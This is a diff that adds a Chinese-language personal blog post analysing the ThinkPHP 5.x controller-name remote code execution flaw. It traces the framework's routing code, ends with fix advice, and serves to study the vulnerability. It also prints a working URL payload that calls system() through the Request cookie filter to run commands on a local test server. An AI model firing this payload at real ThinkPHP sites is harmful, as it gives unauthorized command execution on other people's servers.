@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Thinkphp5x远程代码执行 | li9hu&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="漏洞原因 由于未对控制器名进行有效的安全过滤和检查，导致攻击者可以调用任意类的任意方法，通过存在危险函数的方法达到远程代码执行。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp5x远程代码执行">
+<meta property="og:url" content="http://yoursite.com/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="li9hu&#39;s Blog">
+<meta property="og:description" content="漏洞原因 由于未对控制器名进行有效的安全过滤和检查，导致攻击者可以调用任意类的任意方法，通过存在危险函数的方法达到远程代码执行。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117172624.png">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117172959.png">
+<meta property="og:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117174937.png">
+<meta property="article:published_time" content="2020-01-17T02:24:25.000Z">
+<meta property="article:modified_time" content="2020-03-24T07:26:24.000Z">
+<meta property="article:author" content="li9hu">
+<meta property="article:tag" content="tp5">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117172624.png">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+	<link href="/js/prism/prism.css" rel="stylesheet" />
+	<script src="/js/prism/prism.js" ></script>
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">li9hu</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+                        
+                            <li><a  href="/categories/%E7%AC%94%E8%AE%B0">笔记</a></li>
+                        
+                            <li><a  href="/%E8%AE%A1%E5%88%92">计划</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/ewan9hu" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/discuz/" style="font-size: 13.33px;">discuz</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/duomi/" style="font-size: 10px;">duomi</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/php/" style="font-size: 16.67px;">php</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/socket/" style="font-size: 10px;">socket</a> <a href="/tags/sql/" style="font-size: 13.33px;">sql</a> <a href="/tags/tp5/" style="font-size: 10px;">tp5</a> <a href="/tags/%E4%BB%A3%E7%90%86%E6%B1%A0/" style="font-size: 10px;">代理池</a> <a href="/tags/%E9%80%9A%E8%BE%BEOA/" style="font-size: 10px;">通达OA</a> <a href="/tags/%E9%9D%A2%E7%BB%8F/" style="font-size: 10px;">面经</a>
+                    </div>
+                </section>
+                
+                
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">li9hu</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">li9hu</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+                
+                    <li><a href="/categories/%E7%AC%94%E8%AE%B0">笔记</a></li>
+                
+                    <li><a href="/%E8%AE%A1%E5%88%92">计划</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/ewan9hu" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-漏洞分析/Thinkphp5x远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
+      <time datetime="2020-01-17T02:24:25.000Z" itemprop="datePublished">2020-01-17</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Thinkphp5x远程代码执行
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tp5/" rel="tag">tp5</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="漏洞原因">漏洞原因</h3>
+<p>由于未对控制器名进行有效的安全过滤和检查，导致攻击者可以调用任意类的任意方法，通过存在危险函数的方法达到远程代码执行。<a id="more"></a></p>
+<p>寒假开始接触<code>ThinkPHP</code>啦,了解了下<code>MVC</code>模式并粗略的从<code>ThinkPHP</code>的入口文件走了一片流程后，准备着手分析一下之前爆出的远程代码执行的漏洞。</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<ul>
+<li>实验使用的版本是<code>ThinkPHP5.1.1</code></li>
+</ul>
+<p>我们从入口文件一步一步来走，程序首先加载一些基础文件，然后开始执行应用</p>
+<ul>
+<li><code>index.php</code></li>
+</ul>
+<pre><code class="language-php">// 加载基础文件
+require __DIR__ . '/../thinkphp/base.php';
+
+// 执行应用并响应
+Container::get('app')-&gt;run()-&gt;send();
+
+</code></pre>
+<p>跟进<code>Container</code>的<code>get</code>方法。注释说明这个类是用来获取对象实例的。</p>
+<ul>
+<li><code>Container.php</code></li>
+</ul>
+<pre><code class="language-php">   /**
+     * 获取容器中的对象实例
+     * @access public
+     * @param  string        $abstract       类名或者标识
+     * @param  array|true    $vars           变量
+     * @param  bool          $newInstance    是否每次创建新的实例
+     * @return object
+     */
+    public static function get($abstract, $vars = [], $newInstance = false)
+    {
+        return static::getInstance()-&gt;make($abstract, $vars, $newInstance);
+    }
+
+</code></pre>
+<p>经过这个类的操作后会自动引入<code>App.php</code>并且实例化<code>app</code>类。返回后调用<code>app</code>类的<code>run</code>方法来初始化应用，比如加载语言包，是否为<code>debug</code>模式,配置时间等。</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php">public function run()
+ {
+     // 初始化应用
+     $this-&gt;initialize();
+
+     try {
+         ···
+         //此处省略其他设置的配置
+
+         // 获取应用调度信息
+         $dispatch = $this-&gt;dispatch;
+         if (empty($dispatch)) {
+             // 进行URL路由检测
+             $dispatch = $this-&gt;routeCheck();
+     }
+
+</code></pre>
+<p>首次抵达时，<code>dispatch</code>的值为<code>null</code>,则会进行<code>URL</code>路由的检测。</p>
+<p>跳到<code>routeCheck</code>方法可以看到会根据<code>PATH_INFO</code>信息来对<code>URL</code>的路由经行检测，返回一个调度。</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php">/**
+ * URL路由检测（根据PATH_INFO)
+ * @access public
+ * @return Dispatch
+ */
+public function routeCheck()
+{
+    $path = $this-&gt;request-&gt;path();
+
+</code></pre>
+<p>程序先回通过<code>Container</code>类来注册<code>requests</code>对象,然后执行<code>path</code>方法，我们直接跟进<code>path</code>方法。</p>
+<ul>
+<li><code>Request.php</code></li>
+</ul>
+<pre><code class="language-php">public function path()
+{
+    if (is_null($this-&gt;path)) {
+        $suffix   = $this-&gt;config-&gt;get('url_html_suffix');
+        $pathinfo = $this-&gt;pathinfo();
+
+</code></pre>
+<p><code>suffix</code>用来防止静态访问，我们继续跟进<code>pathinfo</code>方法。</p>
+<ul>
+<li><code>Request.php</code></li>
+</ul>
+<pre><code class="language-php">public function pathinfo()
+  {
+      if (is_null($this-&gt;pathinfo)) {
+          if (isset($_GET[$this-&gt;config-&gt;get('var_pathinfo')])) {
+              // 判断URL里面是否有兼容模式参数
+              $_SERVER['PATH_INFO'] = $_GET[$this-&gt;config-&gt;get('var_pathinfo')];
+
+</code></pre>
+<p>从这里可以知道路由会先判断我们的请求是不是采用的兼容模式，通过配置文件可知 <code>var_pathinfo</code>的值为<code>s</code>，这样我们可以通过带参的形式来拼接<code>URL</code>。</p>
+<p>例 <code>http://127.0.0.1/public/index?s=index/index/index</code> (控制器，模块，方法)</p>
+<p>采用兼容模式的话，现在返回到<code>App.php</code>后，我们的<code>$path</code>就是我们<code>s=</code>后面的值。接着往下走会判断是否采用了强制路由，然后去创建一个调度对象。若开启了强制路由没有匹配到路由规则的话就会返回错误。</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php"> $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;config('app.url_route_must');
+
+        // 路由检测 返回一个Dispatch对象
+        return $this-&gt;route-&gt;check($path, $depr, $must, $this-&gt;config('app.route_complete_match'));
+
+</code></pre>
+<p>因为<code>ThinkPHP5</code>默认是不开启强制路由的，所以我们采用兼容模式能顺利通过，并且返回调度对象。回到<code>App.php</code>后，程序开始执行调度</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php">// 执行调度
+$data = $dispatch-&gt;run();
+
+</code></pre>
+<p>跟进<code>run</code>方法,先是将url通过<code>|</code>替换<code>URL</code>分隔符，默认为<code>\</code>，<code>result</code>调用<code>parseUrl</code>后，将路由经行解析通过上一行的分割规则，返回一个数组（控制器，模块，方法）,往下进行<code>Module</code>的操作。</p>
+<ul>
+<li><code>Url.php</code></li>
+</ul>
+<pre><code class="language-php">public function run()
+{
+    // 解析默认的URL规则
+    $url    = str_replace($this-&gt;param['depr'], '|', $this-&gt;dispatch);
+    $result = $this-&gt;parseUrl($url);
+
+    return (new Module($result))-&gt;run();
+}
+
+</code></pre>
+<p>继续跟进<code>Module</code>的<code>run</code>方法。往下走有个获取控制器名的操作，<code>result</code>的值就是上轮返回来的数组，将数组1的位置的值取出来当控制器名。</p>
+<ul>
+<li><code>Module.php</code></li>
+</ul>
+<pre><code class="language-php">// 获取控制器名
+$controller = strip_tags($result[1] ?: $this-&gt;app-&gt;config('app.default_controller'));
+$controller = $convert ? strtolower($controller) : $controller;
+
+</code></pre>
+<p>接着往下走会有个实例化控制器的操作。</p>
+<pre><code class="language-php"> // 实例化控制器
+ try {
+     $instance = $this-&gt;app-&gt;controller($controller,
+         $this-&gt;app-&gt;config('app.url_controller_layer'),
+         $this-&gt;app-&gt;config('app.controller_suffix'),
+         $this-&gt;app-&gt;config('app.empty_controller'));
+ } catch (ClassNotFoundException $e) {
+     throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass());
+ }
+
+</code></pre>
+<p>我们跟进<code>controoler</code>的操作,在第一行代码调用了<code>parseModuleAndClass</code>方法来解析模块和类名。</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php">public function controller($name, $layer = 'controller', $appendSuffix = false, $empty = '')
+ {
+     list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);
+
+     if (class_exists($class)) {
+         return $this-&gt;__get($class);
+     } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {
+         return $this-&gt;__get($emptyClass);
+     } else {
+         throw new ClassNotFoundException('class not exists:' . $class, $class);
+     }
+ }
+
+</code></pre>
+<p>继续跟进<code>parseModuleAndClass</code>，这里出现了漏洞利用的<strong>关键点</strong>。可以看到如果我们传过来的参数带有<code>\</code>符合的话就会直接返回。刚好我们的命名空间也是通过<code>\</code>来命名的。所以我们的<code>URL</code>可以构造成<code>index/命名空间\类/方法</code>的形式。从而实现任意类的实例化和方法的调用。</p>
+<pre><code class="language-php">protected function parseModuleAndClass($name, $layer, $appendSuffix)
+{
+    if (false !== strpos($name, '\\')) {   # 存在\就直接返回
+        $class  = $name;
+        $module = $this-&gt;request-&gt;module();
+    } else {
+        if (strpos($name, '/')) {
+            list($module, $name) = explode('/', $name, 2);
+        } else {
+            $module = $this-&gt;request-&gt;module();
+        }
+
+        $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);
+    }
+
+    return [$module, $class];
+}
+
+</code></pre>
+<p><code>return</code>回到<code>Module.php</code>后，我们继续往下走便是获取方法名，然后执行方法返回结果回到<code>App.php</code>赋给<code>$data</code>，<code>App.php</code>往下走的话就是将数据显示到屏幕，最后记录日志。代码就不贴了，整个运行流程大致就是这个样子,我们也从上面的流程得出了漏洞产生的原因。</p>
+<p>现在我们试验一下，在<code>App.php</code>文件下创建一个<code>li9hu</code>的测试方法。然后测试通过任意类调用任意方法</p>
+<ul>
+<li><code>App.php</code></li>
+</ul>
+<pre><code class="language-php">public function li9hu(){
+    echo 'Just_test';
+}
+
+</code></pre>
+<p>测试payload<code>http://127.0.0.1:8001/public/?s=index/think\app/li9hu</code></p>
+<p>执行后的结果，完美的触发克我们自己刚创建的方法。</p>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117172624.png" alt=""></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>现在我们只需要从自带的文件中找出带有危险函数的方法然后调用它便可。</p>
+<p>通过审计工具定位到一处看起来清晰可利用的点</p>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117172959.png" alt=""></p>
+<p>跟进代码所在位置,<code>value</code>的取值来自一个空间地址。往下就是危险函数<code>call_user_func</code>，我们需要的变量是<code>$value</code>和<code>filters</code> 的值。</p>
+<ul>
+<li><code>Request.php</code></li>
+</ul>
+<pre><code class="language-php">private function filterValue(&amp;$value, $key, $filters)
+{
+    $default = array_pop($filters); //删除最后一个元素
+
+    foreach ($filters as $filter) {
+        if (is_callable($filter)) {
+            // 调用函数或者方法过滤
+            $value = call_user_func($filter, $value);
+
+</code></pre>
+<p>继续跟进哪些方法会调用<code>filterValue</code>.通过<code>PHPstorm</code>定位到同文件下的<code>cookie</code>方法和<code>input</code>方法，我们这里用<code>coolie</code>方法来测试。</p>
+<pre><code class="language-php">public function cookie($name = '', $default = null, $filter = '')
+{
+    $cookie = Container::get('cookie');
+
+    if (empty($this-&gt;cookie)) {
+        $this-&gt;cookie = $cookie-&gt;get();
+    }
+
+    if (is_array($name)) {
+        return $this-&gt;cookie = array_merge($this-&gt;cookie, $name);
+    } elseif (!empty($name)) {
+        $data = $cookie-&gt;has($name) ? $cookie-&gt;get($name) : $default;
+    } else {
+        $data = $this-&gt;cookie;
+    }
+
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, 'filterValue'], $filter);
+        reset($data);
+    } else {
+        $this-&gt;filterValue($data, $name, $filter);
+    }
+
+</code></pre>
+<p>这里我们需要控制<code>$data</code>和<code>$filter</code>的值，当<code>$name</code>的值不为空，<code>$data</code>的值在未找到的情况下默认为<code>$default</code>的值，且<code>$default</code>可控。我们将<code>$filter</code>的值设置为要执行的函数，<code>$default</code>的值为执行参数。</p>
+<p>payload为: <code>http://127.0.0.1:8001/public/?s=index/think\request/cookie&amp;filter=system&amp;default=ls&amp;name=1</code></p>
+<p>结果为</p>
+<p><img src="https://li9hu.oss-cn-shenzhen.aliyuncs.com/discuz/20200117174937.png" alt=""></p>
+<p>漏洞利用成功！ 只要找到危险函数存在的地方就可以利用，还有很多很多可利用的点，这里只测试了一种。</p>
+<h3 id="修复方案">修复方案</h3>
+<p>开启强制路由</p>
+<p>更新官方补丁，增加了对控制器的过滤。</p>
+<h3 id="总结">总结</h3>
+<p>花了几天学习了下<code>ThinkPHP5</code>，才知道还可以动态的自动注册类加载文件然后加载命名空间来使用方法，太强了，虽然看的过程有点迷迷糊糊，但是总算是一步一步的复现出了结果。<code>ThinkPHP</code>还有很多的漏洞待学习，以后慢慢更把~!总结就是看的烦躁的时候就歇着下次继续，总会看完的。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Thinkphp5x远程代码执行</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 li9hu 的个人博客">li9hu</a></p>
+        <p><span>发布时间:</span>2020年01月17日 - 10时24分</p>
+        <p><span>最后更新:</span>2020年03月24日 - 15时26分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="Thinkphp5x远程代码执行">http://yoursite.com/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/　　作者: li9hu" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          入侵检测
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Docker使用记录</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原因"><span class="toc-number">1.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/" title="上一篇: 入侵检测">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/" title="下一篇: Docker使用记录">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/%E7%AC%94%E8%AE%B0/2020%E5%AE%89%E5%85%A8%E5%B2%97%E6%98%A5%E6%8B%9B%E6%80%BB%E7%BB%93/">2020长亭实习</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABGetShell/">通达OA任意文件上传/文件包含GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">python反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PhpMyAdmin%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/">PhpMyAdmin用户界面存在SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/socket%E7%BC%96%E6%88%90/">socket编成</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/%E7%AC%94%E8%AE%B0/python%E5%B8%A6%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA/">python带颜色输出</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/http%E7%8A%B6%E6%80%81%E7%A0%81/">http状态码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%AC%94%E8%AE%B0/sql%E6%93%8D%E4%BD%9C/">sql操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">入侵检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Thinkphp5x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Thinkphp5x远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">Docker使用记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E7%AC%94%E8%AE%B0/%E7%88%AC%E8%99%AB%E8%AE%B0%E5%BD%95%EF%BC%8C%E7%BC%96%E5%86%99%E4%BB%A3%E7%90%86%E6%B1%A0/">爬虫记录，编写代理池</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/duomi3-0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-GetShell/">duomi3.0变量覆盖/GetShell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/">discuzx3.4任意文件删除</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/discuz%206-7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95/">discuz 6.*/7.*全局变量防御绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/%E6%B8%97%E9%80%8F/%E5%85%B3%E4%BA%8EPhar%E7%9A%84%E6%80%BB%E7%BB%93/">关于Phar的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/%E6%B8%97%E9%80%8F/disable-function%E7%BB%95%E8%BF%87/">disable_function绕过</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
